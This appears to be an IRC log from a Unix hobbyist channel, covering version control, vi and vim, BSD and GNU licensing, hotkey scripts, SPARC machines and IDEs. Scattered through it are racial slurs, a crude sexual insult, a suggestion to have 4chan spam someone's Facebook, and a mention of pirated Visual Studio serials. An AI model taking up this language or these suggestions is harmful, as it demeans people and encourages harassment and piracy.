08:05  thang1thang │  companies buy out another company and just keep the same reginal store name but swap inventory to theirs
08:05  thang1thang │  but anyway fucking yessssssssssss. So happy I got the goddamn cursor thing to work
08:05         shix │  NeoTerra: they know
08:06     NeoTerra │  woah
08:06     NeoTerra │  woah
08:06         shix │  i leave to school around 6 anyways
08:06     NeoTerra │  costco != sams club
08:06     NeoTerra │  sams club is owned by walmart
08:06         shix │  wait
08:06         shix │  what
08:06     NeoTerra │  costco is it's own company

08:07  thang1thang │  no I knew it
08:07  thang1thang │  I just mixed the name up somehow in my head
08:07  thang1thang │  there IS another store name for costco, though, I'm sure of it
08:07         shix │  walmart is king of murica
08:07  thang1thang │  walmart is king of the world at this point
08:07         dcat │  lel
08:08  thang1thang │  they operate in every single contenient but antartica
08:08         kori │  thang1thang2: that'd be google
08:08  thang1thang │  no, I'm serious, walmart has stores in china, north america, south america, europe, etc etc...
08:08         kori │  google operates in all continents
08:08         kori │  and in outer space
08:08         kori │  and in parallel dimensions
08:08         kori │  they're that omnipresent
08:09     NeoTerra │  costco is its own company
08:09         kori │  i'll stop being silly and go back to idling
08:09         kori │  :>
08:09     NeoTerra │  you might be thinking of price club
08:09  thang1thang │  right, I got shit messed up in my head
08:09  thang1thang │  yeah I am  lol
08:10  thang1thang │  I knew Wal-Mart and Sam's club were the same, because Sam Walton founded walmart
08:10     NeoTerra │  well technically price club merged with costco
08:10  thang1thang │  but I knew costco had another name for their company in a different region and mixed the two up in my head 'cause of the context
08:10  thang1thang │  technicalities schmecnitalities
08:11     NeoTerra │  lol
08:11     NeoTerra │  well I'm going to bed
08:11     NeoTerra │  night
08:11         quit │  NeoTerra
08:13         dcat │  soo ...
08:13         dcat │  cvs vs git
08:13  thang1thang │  wut
08:14  thang1thang │  personally, I think git is far more ubiquitious
08:14  thang1thang │  so I'd be much faster to use git for 99.9% of everything I'm doing unless I need a certain feature CVS or SVN have that git doesn't have, and t here's no semi-easy workaround
08:15         BigE │  git is better
08:15         BigE │  IMO
08:15         dcat │  svn lel
08:15         shix │  lul
08:15         shix │  mercurial master race
08:15         dcat │  svn masterrace, right
08:15  thang1thang │  hey, I included it for the sake of completeness...
08:15         BigE │  the initial time that it takes to clone everything is totally worth it
08:15         BigE │  git is more flexibile afterwards
08:15  thang1thang │  besides, "some people still use it"
08:16         dcat │  yeah
08:16         BigE │  everythig is moving to git
08:16  thang1thang │  yeh, I love the git cloning times
08:16         dcat │  public executing just to make an example
08:16         BigE │  if you still use svn, you are probably behind the times
08:16         BigE │  however
08:16  thang1thang │  pentadactyl, the firefox plugin, uses svn :p
08:16         BigE │  you can still gitclone and manually select the depth
08:16         BigE │  so you dont HAVE to get everything
08:17         dcat │  I don't get some people mane
08:17  thang1thang │  ?
08:17         dcat │  two friends called me 5 times each yesterday
08:17         dcat │  I didn't pick up
08:17         dcat │  that should be a clear hint
08:17         dcat │  then they come knocking on the door
08:17  thang1thang │  lol
08:18        tbuck │  lol the worst
08:18         dcat │  oh well
08:18         dcat │  I just kept on sleeping
08:18  thang1thang │  "please reconsider joining the mormon church, dcat. I mean, really... Hey, why are you slamming the door on me?"

08:51  thang1thang │  not real freedom
08:51         BigE │  ^^^^^^
08:52         BigE │  x1000000
08:52  thang1thang │  seems like there should be a plugin that offers 'fake' cookies to a website so it works "properly"
08:52         BigE │  well, I use self destructing cookies plugin
08:52        venam │  you can still add them manually
08:52         BigE │  so as soon as you leave the site, it destroys them
08:52  thang1thang │  but while you're on the site, it can track you, so how safe is that really?

09:15  thang1thang │  ahh damn. I'm totally learning how to use vimdiff. I could've seriously used that thing a couple times this last quarter
09:17  thang1thang │  who the hell would want an alias for vi to vim? Stupid plebians
09:25         dcat │  I used to do that ...
09:26  thang1thang │  lol
09:26  thang1thang │  I believe I had it set automatically when I was back on os x

09:26         dcat │  not from
09:26         dcat │  yeah
09:26  thang1thang │  vi has a lot of differences to vim
09:27        yrmt- │  it's very wrong
09:27         dcat │  true
09:27  thang1thang │  it's enough that you can use vi to complete certain types of tasks
09:27         dcat │  but it's all about preferance
09:27  thang1thang │  hundreds/thousands of types faster than vim
09:27      akacase │  I just use ed.
09:27        yrmt- │  vi the editor vim the IDE
09:27  thang1thang │  just due to how they process large buffer commands
09:28  thang1thang │  additionally, aliasing vi to vim leaves no way to start vi up from the commandline
09:28         dcat │  yrmt-: wut.
09:28  thang1thang │  so you're pretty much fucked should your vim for (what ever reason) break
09:28         dcat │  uhh
09:28         dcat │  /usr/bin/vi ?
09:28         dcat │  I used to do it cause I was too used to type vi 
09:29  thang1thang │  meh, yeah you can do that
09:29  thang1thang │  assuming you're not on some god forsaken random shitty distro of linux that has vi in a different place
09:30         dcat │  which vi
09:30  thang1thang │  *not that I know of any. But I'm assuming there's one, poe's law or something
09:30  thang1thang │  which vi wut?
09:30         dcat │  `which vi`
09:30         dcat │  the command
09:31  thang1thang │  ahh shit... I read it in a blog post. I wanna say it was like 4096 pastes of a copied thing or something?
09:31  thang1thang │  It was something that, while incredibly "dumb" to do, wasn't completely out of the realm of possibility when editing large documents like books/full programs/etc
09:31         dcat │  YAAAAAY
09:31  thang1thang │  vi did it in 30 seconds, vim choked on it for 30+ mins
09:32  thang1thang │  in reality it's not a usage scenario that really comes up in most every day life :p
09:32  thang1thang │  yay wut? Got your x to work on BSD?

09:33  thang1thang │  nice. (Why is this so good?)
09:33      akacase │  yrmt: I also have ViGo, and a Go shell as well.
09:33      akacase │  ;)
09:33        yrmt- │  I've been doing go too 
09:33        yrmt- │  loving it
09:33      akacase │  can't argue with Ken Thompson.
09:34        yrmt- │  akacase: link with that go shell?
09:34        yrmt- │  and vigo
09:34         dcat │  because they just implemented it
09:34  thang1thang │  thompson? One of the founders of go?
09:34      akacase │  yes, and founder of C and UNIX.
09:34      akacase │  with Ritchie, of course.
09:34  thang1thang │  ahh right, thought that was the same guy
09:34         dcat │  and plan9
09:34      akacase │  yrmt: oh (Go Shell): https://github.com/michaelmacinnis/oh
09:34  thang1thang │  lol godit
09:35      akacase │  yrmt: ViGo (broken): https://github.com/kisielk/vigo
09:35  thang1thang │  vigo's broken atm?
09:35      akacase │  let's just say, it's not suitable for use.
09:35  thang1thang │  lol yeah, saw that on the github
09:35      akacase │  which is quoting the readme.
09:36  thang1thang │  extremely early development stages, mmm?
09:36  thang1thang │  What's the pro of vigo over vi?
09:36      akacase │  nothing, atm.
09:36        yrmt- │  akacase: cool thanks
09:36      akacase │  in the future, security.
09:36        yrmt- │  security?
09:37  thang1thang │  security? In that it's written in go vs C or in that it's written by avid maintainers?
09:37      akacase │  in that it's written in Go.
09:38  thang1thang │  why does viGo say it's based on godit when godit's emacs like? ._.
09:39  thang1thang │  You know what I'd really like for ViGo?
09:39      akacase │  you don't have to cry, unless he realeses it under GNU.
09:39  thang1thang │  an integrated, robust and well-designed plugin manager
09:39      akacase │  releases*
09:39  thang1thang │  until who releases? And tears why? /confused
09:40      akacase │  no worries, I don't like GNU licensening or userland.
09:40      akacase │  licensing*
09:40  thang1thang │  I'm still confused...
09:40      akacase │  you stated that it was inspired by emacs.
09:41      akacase │  because of godit.
09:41  thang1thang │  oooh got it
09:41  thang1thang │  why would releasing it under GNU make me wanna cry, though?
09:42      akacase │  it was my way of backwardly asking you if you dig GNU.
09:42  thang1thang │  I see...
09:42  thang1thang │  why do you dislike the GNU licensing?
09:43      akacase │  I prefer that source-code be used, not protected.
09:43        yrmt- │  no source code freedom
09:43  thang1thang │  oooh got it
09:43  thang1thang │  yeah that doesn't sound really... unix like
09:43        yrmt- │  well, gnu is not unix
09:43      akacase │  Android uses a Linux kernel, but its userland is BSD, as well as its default shell
09:43        yrmt- │  :3
09:44      akacase │  which is mksh.
09:44      akacase │  (my favorite).
09:44  thang1thang │  yeah I know gnu's not unix. That's what GNU stands for, after all xD
09:44      akacase │  BSD saved the internet.
09:44      akacase │  tcp/ip stack ftw.
09:44  thang1thang │  wait
09:45  thang1thang │  BSD was the originator of tcp?
09:45        yrmt- │  CSRG BSD
09:45      akacase │  ;)
09:45      akacase │  thank your ballsack that it wasn't released under GNU
09:45        yrmt- │  kirk mc kusick was asked from DARPA to work on it
09:45        yrmt- │  iirc
09:45      akacase │  and Stallman is a goof, he admits that he should have used 4.4 BSD Kernel to start with instead of working on Hurd.
09:46        yrmt- │  he's a goofy hacker
09:46      akacase │  so, install FreeBSD, and enjoy.
09:46  thang1thang │  why would he want to use the BSD kernel if he was gonna make a close sourced OS?
09:47        yrmt- │  wut
09:47      akacase │  ^ second wut
09:47  thang1thang │  mm
09:47  thang1thang │  actually just ignore that entire sentence
09:47        yrmt- │  freebsd is one of the most 'open' OS
09:47  thang1thang │  I was asking a question, but the question != the sentence in any reasonable way
09:47        yrmt- │  because it's got almost no GNU anymore :P
09:47  thang1thang │  top link on google for Stallman says he founded the GNU project
09:48  thang1thang │  hence the question. But it doesn't quiiiiiite mesh with his whole being a freedom activist
09:48      akacase │  I can answer your question.
09:48      akacase │  BSD licensening permits that he could have taken the source-code modified it and re-released it under a different license.
09:48      akacase │  like GNU.
09:48      akacase │  but, the original authors must retain credits.
09:49  thang1thang │  okay, thanks. Seems fairly exploitable to have a license like that, I guess
09:49  thang1thang │  stallman has apparently recieved 14 honorary doctorates and professorships, wow...
09:49      akacase │  and eats his toenails
09:49        yrmt- │  lel
09:49  thang1thang │  there's always that one weird habit people have...

09:52         dcat │  yrmt-: not what I meant
09:52  thang1thang │  lol
09:52         dcat │  like, which package it's in
09:52  thang1thang │  should all .h files not be just plain in the /include folder?
09:53  thang1thang │  Or are you asking what to download to get it downloaded as a dependency?
09:53         dcat │  I'm asking which package it's in.
09:53        yrmt- │  dcat: xcb-util-wm
09:53        yrmt- │  it's not packaged, you'll have to get it from freedesktop

09:53         dcat │  thanks bro

09:56  thang1thang │  if we somehow got 4chan to spam his facebook
09:57      akacase │  figure it out and get it done.
09:57  thang1thang │  except that would probably result in... unsavory consequences
09:57      akacase │  I'm off, have a great weekend.

10:14  thang1thang │  he also had said racist stuff about 3 years earlier in an interview, claimed black people were happier before the 60s civil rights movement during the segregation
10:14  thang1thang │  and some other fun stuff like that, and ABC finally had enough with the guy and didn't want him preacing his crap on their channel since they're publically against what he was saying, so they fired him off the show

10:29  thang1thang │  he had a heart attack recently-ish (before the vid), I think it was ~2 months ago?
10:30  thang1thang │  but anyway that's just his technique practice
10:30  thang1thang │  and it's born of osiris-behold's outro solo
10:31         yrmt │   I fucking hate shredders
10:31         vypr │  dammit
10:31         vypr │  ran out of blank dvds
10:31  thang1thang │  lol
10:31  thang1thang │  paper shredders, yrmt?
10:31  thang1thang │  why do you even need blank DVDs?
10:31         vypr │  now i can't burn data bigger than 700MV
10:31         vypr │  MB
10:31         vypr │  thang1thang2: distrohop
10:31         yrmt │  lol i can guitar so fast
10:31         yrmt │  wow very music
10:32  thang1thang │  don't you just use dotfiles and then stuff like dropbox/cloud storage?
10:32         vypr │  git
10:33  thang1thang │  and for your media/document files/etc you keep 99% of that stuff in your home folder anyway, just move your home/user folder to a separate partition and then hop distros willy nilly and link your homefolder every time you get a new distro
10:33  thang1thang │  should that not negate any need for DVDs?
10:35         vypr │  i would still have to be able to install and burn the disks for me to even use another distro
10:37  thang1thang │  do you not put distros on USBs to make them bitching live disks and stuff?
10:37         vypr │  not really
10:37         vypr │  it mostly breaks for me on USB.
10:37  thang1thang │  because of your computer or?
10:37         vypr │  just how i put it on the usb
10:38  thang1thang │  put it on the usb correctly then? /hurr

10:44         vypr │  felp whit
10:44  thang1thang │  I thought I had set my sxhkd hotkey to correctly toggle a script to hide my mouse
10:44  thang1thang │  apparently every time I hit the hotkey it would just spawn a different instance of said script...
10:44  thang1thang │  so now there's ~45 or so instances of the script running right now?
10:44  thang1thang │  it's a really light script so idc, it's just annoying 'cause now I gotta fix the hotkey

10:47        dami0 │  thang1thang2: just do the file switch so it can check/toggle
10:47        venam │  I want one
10:48         vypr │  heh
10:48         vypr │  "limited supply - meaning that until RMS dies"
10:48  thang1thang │  lol
10:48  thang1thang │  file switch for what?
10:49  thang1thang │  I can't file switch because the current successful program for hiding the cursor
10:49  thang1thang │  hides the cursor while a little process is running, and I just ./hhpc to run said process
10:49  thang1thang │  you can't switch a text file to somehow terminate it when I toggle the mouse to be able to move, can you?
10:52        dami0 │  well, you can run a shell script which runs the program
10:53  thang1thang │  I think I figured it out, imma test this out...
10:55         shix │  100 dollars?
10:56  thang1thang │  I could use one of those too, shix

11:39       Ypnose │  shix: not much and you?
11:39  thang1thang │  what are you cramming?
11:39  thang1thang │  I did that on dead week this quarter. Learned an entire quarter's worth of chemistry in four days ;-;
11:40  thang1thang │  but I got a b on da final so I'm pretty happy :p
11:40        dami0 │  nuclear physics, soft matter and special relativity
11:40  thang1thang │  oooh, that sounds easy to cram... /s
11:40  thang1thang │  I feel for you bro
11:40        dami0 │  the last two are manageable.
11:40         shix │  Ypnose: nothing really
11:40        dami0 │  oh no, it's nuclear astrophysics. more fun
11:41         shix │  when you don't even know what subject you're studying is when you know you're fucked
11:42        dami0 │  i know what subject. I forget the names
11:42        dami0 │  it's pretty much nuclear physics and spectrography techniques used to discern such things at a distance where we see >=1000 years into the past
11:44  thang1thang │  lol
11:44  thang1thang │  how can you not know what subject you're studying for?

12:25        dami0 │  what makes you say that?
12:25        dami0 │  anyway. Need some help on a makefile. used a wildcard filename in an ifeq. 
12:26        dami0 │  it seems to have stopped working for whatever reason. cray cray
12:33         vypr │  dammit

12:35         dcat │  whooops
12:35         dcat │  wrong what
12:35  thang1thang │  I'm using sxhkd, and with the {n-N} option you can make a script alternate with the n option the first time and the N option the second time
12:35         dcat │  chat*

12:35         join │  sam

12:35  thang1thang │  so basically it'll make it into a toggle

12:35         vypr │  ._.
12:35         vypr │  furreal.
12:35  thang1thang │  my only problem is I have one hotkey set up as (terminal command {0-1}) && script {0-1}
12:35         vypr │  calm down gurl
12:35  thang1thang │  instead of being a opt 1/opt 2 toggle, it's opt 1 opt 1 opt 2 opt 2
12:36        dami0 │  bet if you compared vocabulary you wouldn't think that way
12:36  thang1thang │  anyone know how to fix that? 'cause it's bugging the shit out of me
12:43  thang1thang │  fiiiiiiiinally
12:43  thang1thang │  got it working perfectly now
12:44  thang1thang │  it finally hit me that since I had made a script to do 50% of the work, why the fuck was I using an && to make the execution in sxhkd so complex when I could just put THAT in the script
12:44        dami0 │  yeah, that's what I was saying mane
12:44  thang1thang │  yeah, I finally did it that way in the end lol
12:45        dami0 │  scripts are your friend
12:45  thang1thang │  had sxhkd done what I expected it to do
12:45        dami0 │  good work.
12:45  thang1thang │  my way would've been simpler in the beginning
12:45        dami0 │  now you can be sure to not have billions of processes.
12:45  thang1thang │  and additionally, I still had to find a secondary script to hide the cursor since xsetroot doesn't do jackshit
12:45        dami0 │  lel
12:46  thang1thang │  and I found a little tutorial on how to kill processes with a script
12:46  thang1thang │  and set up a if/then statement in the bash script
12:46  thang1thang │  so if I hit the f3 media key button then sxhkd writes "./script 0" and if I hit it again, it writes "./script 1" back and forth
12:47  thang1thang │  then the script executes and has its if/then saying 'if option is 0, mouse turns off and cursor hides. If one, mouse turns back on and it searches through pd -A | grep cursorhidefunction and kills all the processes"
12:47  thang1thang │  Feeling pretty good bro
12:47  thang1thang │  slick little setup, I think
12:48        dami0 │  huh, simpler than I would've done. at least in the beginning
12:49          yrmt│  yrmt|away
12:49  thang1thang │  I originally tried to get it to just through sxhkd by using a "disable the cursor && hide the cursor" type of argument
12:49  thang1thang │  however nothing would hide the cursor until I eventually found a script
12:49        dami0 │  huh. x
12:50  thang1thang │  by then I was running an option && script through sxhkd and I got it to work, except apparently sxhkd treats {0-1} && {0-1} as "do option 0 twice then option 1 twice" >_>
12:50  thang1thang │  then I had an "aha" moment and just put everything in the damn script
12:52        dami0 │  >expecting x to be sensible
12:52  thang1thang │   >rookie mistake
12:53  thang1thang │  is it bad that I've already been conditioned enough by unix to consider taking 30 minutes to do anything in Arch as an achievement?
12:53  thang1thang │  "oh I'm just gonna change a setting" lol that'll take forever *only takes 30 minutes* "damn that was fast"
12:55         shix │  brb

13:05  thang1thang │  I'm in bed, and I'm comfy and hammers are hard to find when it's 4am
13:10        dami0 │  thang1thang2: you don't have a hammer under your bed?
13:10  thang1thang │  actually, I have an entire toolkit under my bed
13:11  thang1thang │  i can practiclly take my entire car apart with it
13:11  thang1thang │  yet somehow... no hammer
13:11  thang1thang │  got about 80 wrenches though
13:11        dami0 │  oh. I have at least a wrench.
13:11        dami0 │  I have allen wrenches, a wrench, some screwdrivers and I can do light work on my bike.
13:12        dami0 │  even some electrical tape. I once fixed a lot of stuff with electrical tape
13:12  thang1thang │  actually nah strike that, I don't have many wrenches, I have the fancy twisthy things where you stick your sockets in so you can tighten nuts and stuff
13:12        dami0 │  well, it's an adjustable wrench
13:12        dami0 │  socket wrench?
13:12  thang1thang │  but I do have some screw drivers, allen wrenches, wrench or two, and some electrical tape as well tbh
13:12  thang1thang │  yeh that lol
13:12  thang1thang │  I'm really bad with names if you've noticed
13:12  thang1thang │  I also have a quick bike repair kit that has a spare tube and some small tools
13:14        dami0 │  oh, when I say bike I mean motorcycle
13:14  thang1thang │  oh
13:14  thang1thang │  I have a road-bike like a plebian
13:14  thang1thang │  but it's a 15-lb piece of fucking beauty 
13:15  thang1thang │  I, with moderate fitness level, and having never riden a roadbike in my life, cruised along at ~15-20mph for an hour and a half just randomly one day. You can soar on that thing
13:15  thang1thang │  wish I had a motorcycle though, which one's yours?
13:15        dami0 │  some pleb korean
13:15  thang1thang │  lol
13:15        dami0 │  hyosung aquila 650
13:15  thang1thang │  better than no bike
13:16        dami0 │  runs good though
13:16  thang1thang │  I was kinda expecting a crotch rocket tbh since you said "some pleb korean"
13:16  thang1thang │  looks almost like something designed to cruise around and be comfortable in
13:18        dami0 │  yeah. pleb I meant it's a cheap alternative to something like yamaha or honda
13:19  thang1thang │  lol
13:19  thang1thang │  but at least it runs :p
13:19  thang1thang │  can't really complain too hard I guess

14:17        venam │  if I want to add a provider all I have to do is recompile dl_factory.so and swap it by the new one
14:18        venam │  but I might go a step further and turn the interface into a Model View Controller, like that I'll be able to swap between multiple interfaces dynamicly

18:06         yrmt │  what is iotek then
18:06        dami0 │  it's a bunch of people who code stuff together and have a fun time
18:06         yrmt │  sorry, I'm just confused

08:14         shix │  venam: yeah, he's trying to get some maid to "help" him out
08:14         BigE │  they are devoid of quite a few libraries that are required to compile a lot of software, so just hit up NeoTerra when he is on and he will install them
08:15         BigE │  i *tried* to give him a list of all the stuff i think a debian server needs
08:15         BigE │  but i am sure i missed some stuff

08:15         BigE │  just hit him up about it
08:15        venam │  shix: but he has a fucking small cock

09:42         dcat │  still <200 lines
09:42   Neuromatic │  all? I remember it were two 
09:42         dcat │  list, remove, post
09:42   Neuromatic │  Oh yes
09:43        venam │  why didn't you use getopt?
09:43   Neuromatic │  Nice^^
09:43         dcat │  seemed uneccesary 
09:43         dcat │  I used getopt on the previous one
09:43        venam │  it might be atm, but it's more conventional
09:44         dcat │  and z3bra made a good point that I'll learn by just removing stuff like getopt
09:50      akacase │  I found a SunOS 3.5 image for a Sun3.

09:51         BigE │  lol
09:51         BigE │  find an emulator
09:51   Neuromatic │  Did anyone try SPARC?
09:52      akacase │  circa 1988, cool.
09:52   Neuromatic │  Its expensive so I'll never have a sparc machine. Is it fappable?
09:53      akacase │  you can buy a sparc ultra 30 on ebay for like $30.
09:53   Neuromatic │  wut
09:54      akacase │  you gotta find an old one, but ebay SPARC workstation.
09:54   Neuromatic │  Time to collect my money
09:54      akacase │  there's a classic with a whopping 32MB of ram for $50.

10:04        venam │  so it's good
10:04         vypr │  yeah
10:04         dcat │  venam: do you consider it a problem though?
10:04         dcat │  not using getopt, that is
10:05        venam │  getopt makes it easy to use long options and flags
10:05        venam │  it's more standardised
10:05         dcat │  true
10:05         dcat │  but in this case, you wont use more than 2 arguments
10:06         dcat │  so I really can't justify using it
10:06        venam │  true
10:07        venam │  like I said yesterday "if you don't need it now, don't do it now"
10:07         dcat │  yeah, exactly
10:07         yrmt │  Neuromatic: why do you want a SPARC
10:07         dcat │  good saying
10:07   Neuromatic │  yrmt: Just to get one and trying how it feels
10:08        venam │  because you might never need it
10:08         dcat │  yeah
10:09         dcat │  on a project that might need expansion, I would use getopt
10:09         yrmt │  dcat: why'd you remove target on the makefile
10:11         dcat │  cause if people wanna rename it, they can make an alias

10:34         yrmt │  no idea, I just used the OS for programming course
10:35   Neuromatic │  Hm, I thought there must be anything special. 30% of all german *nix users are on SPARC machines.
10:36         yrmt │  I doubt that very much
10:36         yrmt │  90% of unix people are on x86

10:37   Neuromatic │  *is
10:39   Neuromatic │  yea most people are on x86. But there must be a reason why some niggas chooses sparc. I hoped when I using it I can find the answer in the feeling.
10:43         yrmt │  Seems you want it for no good reason

23:29        bosko │  all the prerequisites are retarded
23:29         vypr │  bosko: Is VS Ultimate worth it?
23:29         vypr │  I found some serials online. :3
23:29        bosko │  nah
23:29        bosko │  vs desktop 2013
23:29        bosko │  has been pretty sufficient for me
23:29        bosko │  the ultimate/pro versions
23:29        bosko │  seem to just have team/busienss oriented featurest
23:30        bosko │  that normal people dont need
23:30        bosko │  and since the express edition comes with x64 and arm compilers and linkers
23:30        bosko │  the pro edition used to come with x64 toolset
23:30        bosko │  only thing that made it worth $$
23:31         vypr │  Meh.
23:31         vypr │  I can't wait to get VS installed.
23:31         vypr │  I needs mah compiler.
23:31         BigE │  ><vypr> I can't wait to get VS installed.
23:31         BigE │  said no one ever
23:31         vypr │  TIL I'm no one.
23:31  thang1thang │  lol
23:32        bosko │  vs = best ide
23:32         BigE │  pretty much.
23:32  thang1thang │  to be fair, VS is actually pretty damn good for some stuff
23:32        bosko │  and best compiler/linker on windows
23:32        bosko │  end of
23:32  thang1thang │  ^
23:32      bottomy │  lol
23:32  thang1thang │  If you need an IDE, VS really isn't bad no matter what you're doing. It's the best IDE by far on windows, though.
23:32      bottomy │  does it even support C99 yet?
23:33        bosko │  bottomy, finally yes
23:33        bosko │  i beleive vs 2013
23:33        bosko │  has *full* C99 suppor
23:33        bosko │  t
23:33        bosko │  but lets be honest, C89 is enough
23:33        bosko │  for real old school C
23:33        bosko │  C99/C11 are slowly turning into C++-like languages
23:33        bosko │  its pretty horrifying
23:34      bottomy │  some important things weren't even standardised in C89 though
23:34        bosko │  well it compiles C
23:34        bosko │  and thats all that matters for me really
23:36  thang1thang │  the C family
23:36  thang1thang │  is like that one person who was really cool, then he decided he needed some hobbies
23:36  thang1thang │  and then, ten years later, he can play 15 different types of instruments
23:36  thang1thang │  speak 7 langauges, and ride a unicycle
23:36  thang1thang │  but he sucks at all of them
23:37       jjumbii│  jmbi-afk
23:37        bosko │  anyone ever seen the movie "the fly"
23:37        bosko │  where after he comes out of the teleporter horribly deformed
23:37        bosko │  and mangled
23:37  thang1thang │  nope, what's it about?
23:37         yrmt │  yep
23:37        bosko │  he pulls the shotgun the girl is holding to his head
23:38        bosko │  and signals her to pull the trigger
23:38        bosko │  thats basically what C++ is like
23:38  thang1thang │  lol
23:38  thang1thang │  my arch is finally really pretty and stuff
23:38  thang1thang │  but I wanna change the BG 'cause it's set with the login thing I'm using (slate) and I don't really like it
23:39  thang1thang │  and I need to change the colors on everything to stop being so ugly and stuff
23:39      bottomy │  thang1thang2: C hasn't really grown like that though, it's stayed pretty small. most of the features that have been added through the revisions are things that it really needs to have standardised (such as threading, atomics, alignment, etc.). only thing it's missing as far as I'm concerned is vector types
23:39  thang1thang │  mmm, C++ certainly feels like that though ._.
23:39         vypr │  bottomy needs his own rank.
23:39         vypr │  "The C Wizard"
23:40  thang1thang │  and thanks for the clarification, bottomy. I'm more familiar with C++ and just assumed C had grown similarly awkwardly over the years
23:40        bosko │  bottomy, threading in c/c++ is a joke
23:40        bosko │  at least the stl/posix implementations
23:40        bosko │  that are sugggested to use
23:40        bosko │  windows nailed it though
23:40           eye│  eye`off
23:40        bosko │  with their threading implementation
23:41         vypr │  Could someone tell me if my code is correct or not? I'm not really using an IDE, so I can't tell if I made errors. 
23:41      bottomy │  concurrency is a joke in general with all these lower level languages/ones not designed from the beginning with concurrency in mind, but it's important to have threading low level.
23:41         vypr │  These are just small programs from /r/dailprogrammer challenges.
23:41         vypr │  https://ghostbin.com/paste/ubjcf
23:42  thang1thang │  oh the dailyprogrammer subreddit, nice. I haven't attempted any of the challenges yet; laziness and all that...
23:42         vypr │  https://ghostbin.com/paste/bqqjd
23:42         vypr │  thang1thang2: I used the challenges made by the original creator, as his are much easier and I'm a C nub.
23:42        bosko │  you should really put a \n
23:42  thang1thang │  so I should go through it from the beginning down then? :p
23:43        bosko │  at the end of your printf statement
23:43        bosko │  to hit a new line
23:43         vypr │  bosko: Meh, don't really need new lines.
23:43        bosko │  aight
23:43        bosko │  well compile it and run it
23:43        bosko │  and see the problemo
23:43  thang1thang │  he can't lol
23:43      bottomy │  bosko: main problem with POSIX threads is they didn't add atomics. which is just as important with any threading implementation IMO
23:43         vypr │  lul.
23:43  thang1thang │  > no IDE, can't tell if problems
23:43        bosko │  bottomy, atomic operations you mean?
23:43      bottomy │  yeh
23:44  thang1thang │  anyway, what are your guys' favorite IDEs for linux?
23:44        bosko │  hmm, well most cpu archs
23:44        bosko │  have atomic instructions
23:44        bosko │  or execute read/writes of aligned variables
23:44        bosko │  in 1 step anyway
23:44  thang1thang │  I'll need some error checking vim doesn't have for my programming class
23:44        bosko │  but even then they offer atomic instructions
23:44        bosko │  xchg cmpxchg(8b)
23:44        bosko │  etc
23:44        bosko │  thats what i have been doing when on risky architectures
23:44      bottomy │  yes but POSIX doesn't offer any standard way of performing atomics while it offers threading
23:44        bosko │  yeah
23:45         BigE │  thang1thang2: Intelli J
23:45        bosko │  bottomy, does linux even have a concept of "threads"
23:45        bosko │  unix in general actually
23:45     ne0phyte │  thang1thang2: why not compile and check the output?
23:45        bosko │  or is it some sort of messy fork() hack
23:45         yrmt │  freebsd has threading in their libc
23:45      bottomy │  Mach does, idk much about threading in other environments
23:45        bosko │  bottomy, proper native threads
23:45        bosko │  handled by the kernel?
23:45        bosko │  i remember reading somewhere that some threading libs
23:45  thang1thang │  meh... compiling and checking the output would do pretty much the same thing, wouldn't it?
23:45        bosko │  actually executing the code from the userland
23:45        bosko │  :|
23:46         yrmt │  OS X is based on Mach and BSD. Like Mach and most BSD UNIX systems, it contains an advanced scheduler based on the CMU Mach 3 scheduler. This chapter describes the scheduler from the perspective of both a kernel programmer and an application developer attempting to set scheduling parameters.
23:46        bosko │  or w/e way to word it
23:46     ne0phyte │  thang1thang2: depending on the IDE thats exactly what happens in the background
23:46  thang1thang │  the class uses Code::Blocks ._.
23:46     ne0phyte │  except for some languages (Eclipse actually parses and generates an AST for Java code)
23:46     ne0phyte │  so it understands the code
23:46     ne0phyte │  and can detect problems/flaws
23:46  thang1thang │  and I'm doing C++ in the class for now
23:46     ne0phyte │  without compiling/running the whole project
23:46        bosko │  >C++
23:47        bosko │  >Code::Blocks
23:47        bosko │  drop dead
23:47         vypr │  thang1thang2: Code::Blocks was nice.
23:47      bottomy │  lol
23:47        bosko │  you heathen bastard
23:47         vypr │  bosko: be nice.
23:47        bosko │  ok
23:47      bottomy │  I remember when Code::Blocks stable build for OS X wouldn't even launch xD
23:47        bosko │  i remember back when code::blocks was good
23:47        bosko │  said nowone ever
23:48        bosko │  i cringe internally
23:48  thang1thang │  I didn't exactly pick code::blocks OR c++ that's just what the class uses
23:48        bosko │  when i see people using code::blocks/codeLite
23:48        bosko │  code::blocks + mingw on windows
23:48        bosko │  deserved a good hard slap on the face
23:48        bosko │  to any user
23:48  thang1thang │  and yeah, code::blocks is just... annoying, on OS X
23:48         yrmt │  I can imagine :p
23:49  thang1thang │  It never saved any work, I had to manually save
23:49  thang1thang │  and linking shit was a pain in the ass
23:49  thang1thang │  and whenever I would do a certain type of error (as in "typing too fast" or hitting shift too many times to auto-complete)
23:49  thang1thang │  it would crash and I'd lose everything
23:50       eye`off│  eye
23:50  thang1thang │  but it made me learn vim so I'd say it was worth it :p
23:50      bottomy │  lol typing too fast crashes it?
23:50        bosko │  xcode is a pretty good ide
23:50        bosko │  not gonna lie
23:50        bosko │  just goes to show
23:50        bosko │  what a bit of cash and evil can produce
23:50        bosko │  when the software is being made to make a profit
23:51      bottomy │  lol. it's decent, but it's far from perfect
23:51         yrmt │  fucking boost
23:51  thang1thang │  typing too fast crashed it for me, lol
23:51        bosko │  eww
23:51  thang1thang │  to be fair, I can hit over 80wpm typing code, so idk...
23:51         join │  shix
23:51         mode │  +h shix
23:52  thang1thang │  and xcode is probably the best free IDE on OS X
23:52      bottomy │  typing any speed shouldn't crash any text editor though, that's just a joke if it causes it to crash
23:52  thang1thang │  it actually has less smarts and is more confusing than codeblocks for  C++ imo
23:52  thang1thang │  I liked using codeblocks more but I only used it to run the completed files and check for errors
23:52        bosko │  real niggers use butterflies
23:52        bosko │  and pcc
23:52        bosko │  on some obscure cpu architecture
23:52        bosko │  that nobody has ever heard of
23:53     ne0phyte │  80wpm? what for?
23:53        bosko │  x86 is too mainstream
23:53     ne0phyte │  use snippets and auto-complete :P
23:53  thang1thang │  lol
23:53         shix │  bosko: M-x butterflies
23:53  thang1thang │  80wpm is pretty much the slowest I can type at
23:53        bosko │  ^
23:53  thang1thang │  ^I understood that reference
23:53  thang1thang │  and I do use auto-complete, I don't have snippets set up or autocomplete really set up on vim though. I'm trying to run my vim as minimalistic as possible for a while to learn the underlying power of it rather than using other stuff as a crutch
23:57  thang1thang │  anyway I'm gonna relog and see if I can get irssi working

00:30  thang1thang │  okay I think I found the problem
00:30  thang1thang │  I rebound the control key to my capslock key, but pressing control+something else doesn't register as a shortcut
